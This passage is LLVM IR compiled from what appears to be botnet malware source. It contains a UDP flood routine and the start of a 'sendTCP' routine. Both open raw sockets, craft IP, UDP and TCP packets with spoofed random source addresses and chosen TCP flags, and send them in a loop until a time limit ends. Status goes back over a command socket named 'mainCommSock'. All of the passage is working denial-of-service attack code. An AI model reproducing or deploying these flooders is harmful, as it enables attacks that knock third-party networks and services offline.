  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %49, i8 0, i64 8, i1 false)
  %50 = load i32, i32* %12, align 4
  store i32 %50, i32* %14, align 4
  %51 = load i32, i32* %10, align 4
  %52 = icmp eq i32 %51, 32
  br i1 %52, label %53, label %108

53:                                               ; preds = %47
  %54 = call i32 @socket(i32 2, i32 2, i32 17) #12
  store i32 %54, i32* %15, align 4
  %55 = load i32, i32* %15, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %60, label %57

57:                                               ; preds = %53
  %58 = load i32, i32* @mainCommSock, align 4
  %59 = call i32 (i32, i8*, ...) @sockprintf(i32 %58, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i64 0, i64 0))
  br label %278

60:                                               ; preds = %53
  %61 = load i32, i32* %11, align 4
  %62 = add nsw i32 %61, 1
  %63 = sext i32 %62 to i64
  %64 = call noalias align 16 i8* @malloc(i64 %63) #12
  store i8* %64, i8** %16, align 8
  %65 = load i8*, i8** %16, align 8
  %66 = icmp eq i8* %65, null
  br i1 %66, label %67, label %68

67:                                               ; preds = %60
  br label %278

68:                                               ; preds = %60
  %69 = load i8*, i8** %16, align 8
  %70 = load i32, i32* %11, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %69, i8 0, i64 %72, i1 false)
  %73 = load i8*, i8** %16, align 8
  %74 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %73, i32 %74)
  %75 = call i64 @time(i64* null) #12
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = add nsw i64 %75, %77
  %79 = trunc i64 %78 to i32
  store i32 %79, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %80

80:                                               ; preds = %68, %103, %104
  %81 = load i32, i32* %15, align 4
  %82 = load i8*, i8** %16, align 8
  %83 = load i32, i32* %11, align 4
  %84 = sext i32 %83 to i64
  %85 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %86 = call i64 @sendto(i32 %81, i8* %82, i64 %84, i32 0, %struct.sockaddr* %85, i32 16)
  %87 = load i32, i32* %18, align 4
  %88 = load i32, i32* %14, align 4
  %89 = icmp eq i32 %87, %88
  br i1 %89, label %90, label %104

90:                                               ; preds = %80
  %91 = load i32, i32* %8, align 4
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %93, label %97

93:                                               ; preds = %90
  %94 = call i32 @rand_cmwc()
  %95 = trunc i32 %94 to i16
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %95, i16* %96, align 2
  br label %97

97:                                               ; preds = %93, %90
  %98 = call i64 @time(i64* null) #12
  %99 = load i32, i32* %17, align 4
  %100 = sext i32 %99 to i64
  %101 = icmp sgt i64 %98, %100
  br i1 %101, label %102, label %103

102:                                              ; preds = %97
  br label %107

103:                                              ; preds = %97
  store i32 0, i32* %18, align 4
  br label %80

104:                                              ; preds = %80
  %105 = load i32, i32* %18, align 4
  %106 = add i32 %105, 1
  store i32 %106, i32* %18, align 4
  br label %80

107:                                              ; preds = %102
  br label %278

108:                                              ; preds = %47
  %109 = call i32 @socket(i32 2, i32 3, i32 17) #12
  store i32 %109, i32* %19, align 4
  %110 = load i32, i32* %19, align 4
  %111 = icmp ne i32 %110, 0
  br i1 %111, label %115, label %112

112:                                              ; preds = %108
  %113 = load i32, i32* @mainCommSock, align 4
  %114 = call i32 (i32, i8*, ...) @sockprintf(i32 %113, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i64 0, i64 0))
  br label %278

115:                                              ; preds = %108
  store i32 1, i32* %20, align 4
  %116 = load i32, i32* %19, align 4
  %117 = bitcast i32* %20 to i8*
  %118 = call i32 @setsockopt(i32 %116, i32 0, i32 3, i8* %117, i32 4) #12
  %119 = icmp slt i32 %118, 0
  br i1 %119, label %120, label %123

120:                                              ; preds = %115
  %121 = load i32, i32* @mainCommSock, align 4
  %122 = call i32 (i32, i8*, ...) @sockprintf(i32 %121, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i64 0, i64 0))
  br label %278

123:                                              ; preds = %115
  store i32 50, i32* %21, align 4
  br label %124

124:                                              ; preds = %128, %123
  %125 = load i32, i32* %21, align 4
  %126 = add nsw i32 %125, -1
  store i32 %126, i32* %21, align 4
  %127 = icmp ne i32 %125, 0
  br i1 %127, label %128, label %135

128:                                              ; preds = %124
  %129 = call i64 @time(i64* null) #12
  %130 = call i32 @rand_cmwc()
  %131 = zext i32 %130 to i64
  %132 = xor i64 %129, %131
  %133 = trunc i64 %132 to i32
  call void @srand(i32 %133) #12
  %134 = call i32 @rand() #12
  call void @init_rand(i32 %134)
  br label %124, !llvm.loop !43

135:                                              ; preds = %124
  %136 = load i32, i32* %10, align 4
  %137 = icmp eq i32 %136, 0
  br i1 %137, label %138, label %139

138:                                              ; preds = %135
  store i32 0, i32* %22, align 4
  br label %145

139:                                              ; preds = %135
  %140 = load i32, i32* %10, align 4
  %141 = sub nsw i32 32, %140
  %142 = shl i32 1, %141
  %143 = sub nsw i32 %142, 1
  %144 = xor i32 %143, -1
  store i32 %144, i32* %22, align 4
  br label %145

145:                                              ; preds = %139, %138
  %146 = load i32, i32* %11, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 28, %147
  %149 = call i8* @llvm.stacksave()
  store i8* %149, i8** %23, align 8
  %150 = alloca i8, i64 %148, align 16
  store i64 %148, i64* %24, align 8
  %151 = bitcast i8* %150 to %struct.iphdr*
  store %struct.iphdr* %151, %struct.iphdr** %25, align 8
  %152 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = getelementptr i8, i8* %153, i64 20
  %155 = bitcast i8* %154 to %struct.udphdr*
  store %struct.udphdr* %155, %struct.udphdr** %26, align 8
  %156 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %158 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %157, i32 0, i32 0
  %159 = load i32, i32* %158, align 4
  %160 = load i32, i32* %22, align 4
  %161 = call i32 @getRandomIP(i32 %160)
  %162 = call i32 @htonl(i32 %161) #15
  %163 = load i32, i32* %11, align 4
  %164 = sext i32 %163 to i64
  %165 = add i64 8, %164
  %166 = trunc i64 %165 to i32
  call void @makeIPPacket(%struct.iphdr* %156, i32 %159, i32 %162, i8 zeroext 17, i32 %166)
  %167 = load i32, i32* %11, align 4
  %168 = sext i32 %167 to i64
  %169 = add i64 8, %168
  %170 = trunc i64 %169 to i16
  %171 = call zeroext i16 @htons(i16 zeroext %170) #15
  %172 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon.2* %173 to %struct.anon.4*
  %175 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %174, i32 0, i32 2
  store i16 %171, i16* %175, align 2
  %176 = call i32 @rand_cmwc()
  %177 = trunc i32 %176 to i16
  %178 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.2* %179 to %struct.anon.4*
  %181 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %180, i32 0, i32 0
  store i16 %177, i16* %181, align 2
  %182 = load i32, i32* %8, align 4
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %184, label %186

184:                                              ; preds = %145
  %185 = call i32 @rand_cmwc()
  br label %191

186:                                              ; preds = %145
  %187 = load i32, i32* %8, align 4
  %188 = trunc i32 %187 to i16
  %189 = call zeroext i16 @htons(i16 zeroext %188) #15
  %190 = zext i16 %189 to i32
  br label %191

191:                                              ; preds = %186, %184
  %192 = phi i32 [ %185, %184 ], [ %190, %186 ]
  %193 = trunc i32 %192 to i16
  %194 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i32 0, i32 0
  %196 = bitcast %union.anon.2* %195 to %struct.anon.4*
  %197 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %196, i32 0, i32 1
  store i16 %193, i16* %197, align 2
  %198 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %199 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.2* %199 to %struct.anon.4*
  %201 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %200, i32 0, i32 3
  store i16 0, i16* %201, align 2
  %202 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %203 = bitcast %struct.udphdr* %202 to i8*
  %204 = getelementptr inbounds i8, i8* %203, i64 8
  %205 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %204, i32 %205)
  %206 = bitcast i8* %150 to i16*
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 2
  %209 = load i16, i16* %208, align 2
  %210 = zext i16 %209 to i32
  %211 = call zeroext i16 @csum(i16* %206, i32 %210)
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 7
  store i16 %211, i16* %213, align 2
  %214 = call i64 @time(i64* null) #12
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = add nsw i64 %214, %216
  %218 = trunc i64 %217 to i32
  store i32 %218, i32* %27, align 4
  store i32 0, i32* %28, align 4
  br label %219

219:                                              ; preds = %273, %272, %191
  br label %220

220:                                              ; preds = %219
  %221 = load i32, i32* %19, align 4
  %222 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %221, i8* %150, i64 %148, i32 0, %struct.sockaddr* %222, i32 16)
  %224 = call i32 @rand_cmwc()
  %225 = trunc i32 %224 to i16
  %226 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.2* %227 to %struct.anon.4*
  %229 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %228, i32 0, i32 0
  store i16 %225, i16* %229, align 2
  %230 = load i32, i32* %8, align 4
  %231 = icmp eq i32 %230, 0
  br i1 %231, label %232, label %234

232:                                              ; preds = %220
  %233 = call i32 @rand_cmwc()
  br label %239

234:                                              ; preds = %220
  %235 = load i32, i32* %8, align 4
  %236 = trunc i32 %235 to i16
  %237 = call zeroext i16 @htons(i16 zeroext %236) #15
  %238 = zext i16 %237 to i32
  br label %239

239:                                              ; preds = %234, %232
  %240 = phi i32 [ %233, %232 ], [ %238, %234 ]
  %241 = trunc i32 %240 to i16
  %242 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 0
  %244 = bitcast %union.anon.2* %243 to %struct.anon.4*
  %245 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %244, i32 0, i32 1
  store i16 %241, i16* %245, align 2
  %246 = call i32 @rand_cmwc()
  %247 = trunc i32 %246 to i16
  %248 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 3
  store i16 %247, i16* %249, align 4
  %250 = load i32, i32* %22, align 4
  %251 = call i32 @getRandomIP(i32 %250)
  %252 = call i32 @htonl(i32 %251) #15
  %253 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %254 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %253, i32 0, i32 8
  store i32 %252, i32* %254, align 4
  %255 = bitcast i8* %150 to i16*
  %256 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 2
  %258 = load i16, i16* %257, align 2
  %259 = zext i16 %258 to i32
  %260 = call zeroext i16 @csum(i16* %255, i32 %259)
  %261 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 7
  store i16 %260, i16* %262, align 2
  %263 = load i32, i32* %28, align 4
  %264 = load i32, i32* %14, align 4
  %265 = icmp eq i32 %263, %264
  br i1 %265, label %266, label %273

266:                                              ; preds = %239
  %267 = call i64 @time(i64* null) #12
  %268 = load i32, i32* %27, align 4
  %269 = sext i32 %268 to i64
  %270 = icmp sgt i64 %267, %269
  br i1 %270, label %271, label %272

271:                                              ; preds = %266
  br label %276

272:                                              ; preds = %266
  store i32 0, i32* %28, align 4
  br label %219

273:                                              ; preds = %239
  %274 = load i32, i32* %28, align 4
  %275 = add i32 %274, 1
  store i32 %275, i32* %28, align 4
  br label %219

276:                                              ; preds = %271
  %277 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %277)
  br label %278

278:                                              ; preds = %46, %57, %67, %112, %120, %276, %107
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #8

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendTCP(i8* %0, i32 %1, i32 %2, i32 %3, i8* %4, i32 %5, i32 %6) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i64, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.tcphdr*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

31:                                               ; preds = %7
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

35:                                               ; preds = %7
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #15
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

40:                                               ; preds = %35, %31
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  br label %343

46:                                               ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %48, i8 0, i64 8, i1 false)
  %49 = call i32 @socket(i32 2, i32 3, i32 6) #12
  store i32 %49, i32* %17, align 4
  %50 = load i32, i32* %17, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %55, label %52

52:                                               ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i64 0, i64 0))
  br label %343

55:                                               ; preds = %46
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #12
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %63

60:                                               ; preds = %55
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i64 0, i64 0))
  br label %343

63:                                               ; preds = %55
  %64 = load i32, i32* %11, align 4
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %67

66:                                               ; preds = %63
  store i32 0, i32* %19, align 4
  br label %73

67:                                               ; preds = %63
  %68 = load i32, i32* %11, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  br label %73

73:                                               ; preds = %67, %66
  %74 = load i32, i32* %13, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %78 = alloca i8, i64 %76, align 16
  store i64 %76, i64* %21, align 8
  %79 = bitcast i8* %78 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %22, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %23, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #15
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %12, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i64 0, i64 0)) #11
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %156, label %120

120:                                              ; preds = %73
  %121 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon* %122 to %struct.anon.0*
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 4
  %125 = load i16, i16* %124, align 4
  %126 = and i16 %125, -513
  %127 = or i16 %126, 512
  store i16 %127, i16* %124, align 4
  %128 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon* %129 to %struct.anon.0*
  %131 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %130, i32 0, i32 4
  %132 = load i16, i16* %131, align 4
  %133 = and i16 %132, -1025
  %134 = or i16 %133, 1024
  store i16 %134, i16* %131, align 4
  %135 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 0
  %137 = bitcast %union.anon* %136 to %struct.anon.0*
  %138 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %137, i32 0, i32 4
  %139 = load i16, i16* %138, align 4
  %140 = and i16 %139, -257
  %141 = or i16 %140, 256
  store i16 %141, i16* %138, align 4
  %142 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon* %143 to %struct.anon.0*
  %145 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = and i16 %146, -4097
  %148 = or i16 %147, 4096
  store i16 %148, i16* %145, align 4
  %149 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon* %150 to %struct.anon.0*
  %152 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %151, i32 0, i32 4
  %153 = load i16, i16* %152, align 4
  %154 = and i16 %153, -2049
  %155 = or i16 %154, 2048
  store i16 %155, i16* %152, align 4
  br label %233

156:                                              ; preds = %73
  %157 = load i8*, i8** %12, align 8
  %158 = call i8* @strtok(i8* %157, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %158, i8** %24, align 8
  br label %159

159:                                              ; preds = %230, %156
  %160 = load i8*, i8** %24, align 8
  %161 = icmp ne i8* %160, null
  br i1 %161, label %162, label %232

162:                                              ; preds = %159
  %163 = load i8*, i8** %24, align 8
  %164 = call i32 @strcmp(i8* %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i64 0, i64 0)) #11
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %174, label %166

166:                                              ; preds = %162
  %167 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %168 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon* %168 to %struct.anon.0*
  %170 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %169, i32 0, i32 4
  %171 = load i16, i16* %170, align 4
  %172 = and i16 %171, -513
  %173 = or i16 %172, 512
  store i16 %173, i16* %170, align 4
  br label %230

174:                                              ; preds = %162
  %175 = load i8*, i8** %24, align 8
  %176 = call i32 @strcmp(i8* %175, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i64 0, i64 0)) #11
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %186, label %178

178:                                              ; preds = %174
  %179 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %180 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %179, i32 0, i32 0
  %181 = bitcast %union.anon* %180 to %struct.anon.0*
  %182 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %181, i32 0, i32 4
  %183 = load i16, i16* %182, align 4
  %184 = and i16 %183, -1025
  %185 = or i16 %184, 1024
  store i16 %185, i16* %182, align 4
  br label %229

186:                                              ; preds = %174
  %187 = load i8*, i8** %24, align 8
  %188 = call i32 @strcmp(i8* %187, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i64 0, i64 0)) #11
  %189 = icmp ne i32 %188, 0
  br i1 %189, label %198, label %190

190:                                              ; preds = %186
  %191 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon* %192 to %struct.anon.0*
  %194 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = and i16 %195, -257
  %197 = or i16 %196, 256
  store i16 %197, i16* %194, align 4
  br label %228

198:                                              ; preds = %186
  %199 = load i8*, i8** %24, align 8
  %200 = call i32 @strcmp(i8* %199, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i64 0, i64 0)) #11
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %210, label %202

202:                                              ; preds = %198
  %203 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon* %204 to %struct.anon.0*
  %206 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %205, i32 0, i32 4
  %207 = load i16, i16* %206, align 4
  %208 = and i16 %207, -4097
  %209 = or i16 %208, 4096
  store i16 %209, i16* %206, align 4
  br label %227

210:                                              ; preds = %198
  %211 = load i8*, i8** %24, align 8
  %212 = call i32 @strcmp(i8* %211, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i64 0, i64 0)) #11
  %213 = icmp ne i32 %212, 0
  br i1 %213, label %222, label %214

214:                                              ; preds = %210
  %215 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %216 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %215, i32 0, i32 0
  %217 = bitcast %union.anon* %216 to %struct.anon.0*
  %218 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %219, -2049
  %221 = or i16 %220, 2048
  store i16 %221, i16* %218, align 4
  br label %226

222:                                              ; preds = %210
  %223 = load i32, i32* @mainCommSock, align 4
  %224 = load i8*, i8** %24, align 8
  %225 = call i32 (i32, i8*, ...) @sockprintf(i32 %223, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.91, i64 0, i64 0), i8* %224)
  br label %226

226:                                              ; preds = %222, %214
  br label %227

227:                                              ; preds = %226, %202
  br label %228

228:                                              ; preds = %227, %190
  br label %229

229:                                              ; preds = %228, %178
  br label %230

230:                                              ; preds = %229, %166
  %231 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %231, i8** %24, align 8
  br label %159, !llvm.loop !44

232:                                              ; preds = %159
  br label %233

233:                                              ; preds = %232, %120
  %234 = call i32 @rand_cmwc()
  %235 = trunc i32 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon* %237 to %struct.anon.0*
  %239 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %238, i32 0, i32 5
  store i16 %235, i16* %239, align 2
  %240 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 6
  store i16 0, i16* %243, align 4
  %244 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon* %245 to %struct.anon.0*
  %247 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %246, i32 0, i32 7
  store i16 0, i16* %247, align 2
  %248 = load i32, i32* %9, align 4
  %249 = icmp eq i32 %248, 0
  br i1 %249, label %250, label %252

250:                                              ; preds = %233
  %251 = call i32 @rand_cmwc()
  br label %257

252:                                              ; preds = %233
  %253 = load i32, i32* %9, align 4
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #15
  %256 = zext i16 %255 to i32
  br label %257

257:                                              ; preds = %252, %250
  %258 = phi i32 [ %251, %250 ], [ %256, %252 ]
  %259 = trunc i32 %258 to i16
  %260 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
